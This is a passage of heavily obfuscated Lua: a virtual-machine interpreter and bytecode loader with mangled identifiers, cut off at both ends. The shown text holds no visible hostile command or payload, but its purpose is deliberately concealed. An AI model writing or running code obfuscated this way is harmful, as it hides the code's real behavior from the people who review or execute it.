ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_IlIIIlIllIlIlllIlIlIllll;local function ajefa_IIIlIllIlIllII(...)return{...},ajefa_lllIIllIIIIIlllIlllllII('#',...)end local function ajefa_IIIlIlIlIlIllIIllIIIIlII()local ajefa_lllIlllllIIlI={};local ajefa_lIIIIIlIllIlllllllIIll={};local ajefa_lllIIlIllIlIllllIIlIIlll={};local ajefa_IllIllll={[#{{712;856;40;192};"1 + 1 = 111";}]=ajefa_lIIIIIlIllIlllllllIIll,[#{"1 + 1 = 111";"1 + 1 = 111";{849;800;871;613};}]=nil,[#{{877;722;678;480};"1 + 1 = 111";{359;20;981;925};"1 + 1 = 111";}]=ajefa_lllIIlIllIlIllllIIlIIlll,[#{{339;364;315;982};}]=ajefa_lllIlllllIIlI,};local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_IlIIIlIllIlIlllIlIlIllll()local ajefa_lIIllIlIIlllII={}for ajefa_lIlllIll=1,ajefa_lllIIlIllIlIllllIIlIIlll do local ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lIIIllIlIIIIIllIlII();local ajefa_lllIIlIllIlIllllIIlIIlll;if(ajefa_IlIIIlIllIlIlllIlIlIllll==2)then ajefa_lllIIlIllIlIllllIIlIIlll=(ajefa_lIIIllIlIIIIIllIlII()~=0);elseif(ajefa_IlIIIlIllIlIlllIlIlIllll==3)then ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_llIIllIIIIlI();elseif(ajefa_IlIIIlIllIlIlllIlIlIllll==1)then ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_IIIIllIIlllll();end;ajefa_lIIllIlIIlllII[ajefa_lIlllIll]=ajefa_lllIIlIllIlIllllIIlIIlll;end;for ajefa_IllIllll=1,ajefa_IlIIIlIllIlIlllIlIlIllll()do local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIIllIlIIIIIllIlII();if(ajefa_lIlllIll(ajefa_lllIIlIllIlIllllIIlIIlll,1,1)==0)then local ajefa_IlIIllIIIl=ajefa_lIlllIll(ajefa_lllIIlIllIlIllllIIlIIlll,2,3);local ajefa_IlIIIlIIIIlIIlllI=ajefa_lIlllIll(ajefa_lllIIlIllIlIllllIIlIIlll,4,6);local ajefa_lllIIlIllIlIllllIIlIIlll={ajefa_IIIlIllIllllIIllIlllIIll(),ajefa_IIIlIllIllllIIllIlllIIll(),nil,nil};if(ajefa_IlIIllIIIl==0)then ajefa_lllIIlIllIlIllllIIlIIlll[#("yN5")]=ajefa_IIIlIllIllllIIllIlllIIll();ajefa_lllIIlIllIlIllllIIlIIlll[#("9I8k")]=ajefa_IIIlIllIllllIIllIlllIIll();elseif(ajefa_IlIIllIIIl==1)then ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]=ajefa_IlIIIlIllIlIlllIlIlIllll();elseif(ajefa_IlIIllIIIl==2)then ajefa_lllIIlIllIlIllllIIlIIlll[#("mgK")]=ajefa_IlIIIlIllIlIlllIlIlIllll()-(2^16)elseif(ajefa_IlIIllIIIl==3)then ajefa_lllIIlIllIlIllllIIlIIlll[#("aF7")]=ajefa_IlIIIlIllIlIlllIlIlIllll()-(2^16)ajefa_lllIIlIllIlIllllIIlIIlll[#("Vqbn")]=ajefa_IIIlIllIllllIIllIlllIIll();end;if(ajefa_lIlllIll(ajefa_IlIIIlIIIIlIIlllI,1,1)==1)then ajefa_lllIIlIllIlIllllIIlIIlll[#("q6")]=ajefa_lIIllIlIIlllII[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]end if(ajefa_lIlllIll(ajefa_IlIIIlIIIIlIIlllI,2,2)==1)then ajefa_lllIIlIllIlIllllIIlIIlll[#("NsI")]=ajefa_lIIllIlIIlllII[ajefa_lllIIlIllIlIllllIIlIIlll[#("r8a")]]end if(ajefa_lIlllIll(ajefa_IlIIIlIIIIlIIlllI,3,3)==1)then ajefa_lllIIlIllIlIllllIIlIIlll[#("gvLz")]=ajefa_lIIllIlIIlllII[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]]end ajefa_lllIlllllIIlI[ajefa_IllIllll]=ajefa_lllIIlIllIlIllllIIlIIlll;end end;for ajefa_lllIIlIllIlIllllIIlIIlll=1,ajefa_IlIIIlIllIlIlllIlIlIllll()do ajefa_lIIIIIlIllIlllllllIIll[ajefa_lllIIlIllIlIllllIIlIIlll-1]=ajefa_IIIlIlIlIlIllIIllIIIIlII();end;ajefa_IllIllll[3]=ajefa_lIIIllIlIIIIIllIlII();return ajefa_IllIllll;end;local function ajefa_lIIIllIlIIIIIllIlII(ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_IllIllll,ajefa_IlIIllIIIl)ajefa_lllIIlIllIlIllllIIlIIlll=(ajefa_lllIIlIllIlIllllIIlIIlll==true and ajefa_IIIlIlIlIlIllIIllIIIIlII())or ajefa_lllIIlIllIlIllllIIlIIlll;return(function(...)local ajefa_lIIllIlIIlllII=ajefa_lllIIlIllIlIllllIIlIIlll[1];local ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[3];local ajefa_lllIlllllIIlI=ajefa_lllIIlIllIlIllllIIlIIlll[2];local ajefa_llIIllIIIIlI=ajefa_IIIlIllIlIllII local ajefa_IlIIIlIllIlIlllIlIlIllll=1;local ajefa_lIIIIIlIllIlllllllIIll=-1;local ajefa_lIlIllIlIlIlIIIlIllIllI={};local ajefa_IIIlIllIlIllII={...};local ajefa_lllIIllIIIIIlllIlllllII=ajefa_lllIIllIIIIIlllIlllllII('#',...)-1;local ajefa_IIIlIlIlIlIllIIllIIIIlII={};local ajefa_lIlllIll={};for ajefa_lllIIlIllIlIllllIIlIIlll=0,ajefa_lllIIllIIIIIlllIlllllII do if(ajefa_lllIIlIllIlIllllIIlIIlll>=ajefa_IIIlIllIllllIIllIlllIIll)then ajefa_lIlIllIlIlIlIIIlIllIllI[ajefa_lllIIlIllIlIllllIIlIIlll-ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_IIIlIllIlIllII[ajefa_lllIIlIllIlIllllIIlIIlll+1];else ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll]=ajefa_IIIlIllIlIllII[ajefa_lllIIlIllIlIllllIIlIIlll+#{{73;786;395;508};}];end;end;local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIllIIIIIlllIlllllII-ajefa_IIIlIllIllllIIllIlllIIll+1 local ajefa_lllIIlIllIlIllllIIlIIlll;local ajefa_IIIlIllIllllIIllIlllIIll;while true do ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("5")];if ajefa_IIIlIllIllllIIllIlllIIll<=#("uBSTJKkPag9Hp5FxCZS3Q1BcBL2PCpKWQIKxyjSvD7QW")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("vdEe9cbAdlDaPs7RFmVGm")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("Rui9rhxATk")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("2fIz")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("D")then if ajefa_IIIlIllIllllIIllIlllIIll==#("")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("e0")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("IhV")]];else ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ha")]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("qcL")]];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("xM")then local ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ir")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("4KY")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("IZR2")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{42;319;450;733};{221;677;268;159};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("aOr")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("olgY")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("8q")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{{308;677;93;803};"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Iy8n")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Tl")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("k5b")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("An9R")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("me")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("TpS")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("nf")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ITP")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("qpdh")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ji")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("NlE")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Dx")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("zZP")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("QJ")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Gsb")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("lvbS")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Gy")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("QhO")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("nXyL")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{670;454;543;526};"1 + 1 = 111";}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("bGn")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{877;241;483;177};{709;435;847;902};"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("12")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("LiJ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("JknK")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("e4")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fDO")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Sxxj")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("yh")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";{953;951;332;766};}]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("VH")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("5zm")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("64")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("j1M")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("nLU2")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("M0")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Umu")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("H7")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("4LM")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("8Q")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("LTq")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Cv")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{786;834;756;973};{748;322;622;822};}]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("9D")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("N2u")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sWJ6")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("1V")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("kO0")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Hv")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("K0F")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("3kya")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("mj")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("5Z0")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ok")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("4fh")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{752;945;870;68};{907;511;639;151};}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("YRS")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("V9yi")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("2T")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("1cA")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";{291;962;92;738};{421;491;374;123};}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("h3")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("cRQ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("gcD7")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sB")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("MSl")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Y81d")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("U2")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("HQ8")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("McG2")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("dM")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("yz")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#{{299;974;576;332};"1 + 1 = 111";{260;560;418;589};}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("13")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("3fh")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("yskH")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("cA")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("QzQ")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("aA")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("kZe")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("J2")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("opk")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("12")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("kyP")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eJ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("OJN")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{737;847;88;525};"1 + 1 = 111";"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("P2")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("hbc")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("vJ")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("AOz")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("S9of")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("oX")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("xPS")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("g17i")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("9i")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("JpC")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("qsMS")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Np")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("bpg")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("5tuA")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("un")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("M01")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("SEFv")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("d0")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("7x3")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("p7